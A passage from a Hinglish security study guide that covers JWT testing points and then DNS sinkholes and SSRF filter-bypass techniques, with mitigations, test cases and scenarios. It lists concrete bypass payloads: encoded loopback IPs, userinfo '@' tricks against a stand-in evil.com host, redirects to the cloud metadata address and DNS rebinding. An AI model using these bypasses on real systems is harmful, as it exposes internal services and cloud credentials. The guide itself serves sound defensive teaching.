  • Token storage: localStorage mein JWT? XSS se steal possible?
  • Refresh rotation: refresh token reuse detect hota hai?
  • Scopes: token mein admin scope — endpoint validate karta hai?
Real-world Scenario
Microservices SSO ne JWT choose kiya — services bina session store ke JWKS se verify karti hain; attack surface: JWT attacks — isliye short expiry + rotation + denylist lagaye.

49DNS Sinkhole & SSRF Bypass Techniques

Definition
DNS sinkhole: malicious domain ko resolve karke internal honeypot/block page par bhejna (Pi-hole, enterprise DNS, RPZ) — malware C2, ads, known-bad domains blocked. Testing side: sinkhole detection = environment filtering pata chalta hai. SSRF bypass (in context of filters/sinkholes): URL parser tricks — http://2130706433/ (decimal IP), 0x7f000001 (hex), http://[::1] (IPv6), http://127.1/ (short), @ tricks (http://evil.com@127.0.0.1), redirect-based (302 → internal), DNS rebinding (attacker domain pehle public IP, phir internal resolve), localhost.evil.com, Unicode/encoding, URL normalization differences between filter and fetcher.
Impact
Sinkholes = C2/malware access blocking (defense). SSRF bypass = internal services + metadata access despite filters (attack).
Mitigation (5 points)
  • SSRF: allowlist + resolved-IP validation + no redirects + pin DNS (rebinding roko).
  • Block private/link-local ranges (127/8, 10/8, 172.16/12, 192.168/16, 169.254.169.254).
  • Egress filtering (sinkhole DNS + firewall) — OOB exfil block.
  • IMDSv2 + network policy (metadata protection).
  • WAF + anomaly detection on fetch behaviors.
Test Cases (Hinglish)
  • Sinkhole: Pi-hole/RPZ set karo — malicious domain resolve hota hai? (blocked page?).
  • SSRF encoded: http://2130706433/, 0x7f000001, 127.1, [::1] try karo.
  • Redirect bypass: attacker server 302 → 169.254.169.254 — fetcher follow karta hai?
  • DNS rebinding: rebind.network domain use karke internal IP resolve (lab).
  • Metadata: IMDSv2 token required? PUT /latest/api/token — block hai?
Real-world Scenario
Enterprise DNS sinkhole ne C2 domain block kiya → ransomware beacon fail hua. SSRF test: decimal IP encoding se metadata endpoint hit hua kyunki filter sirf "169.254" string check karta tha.
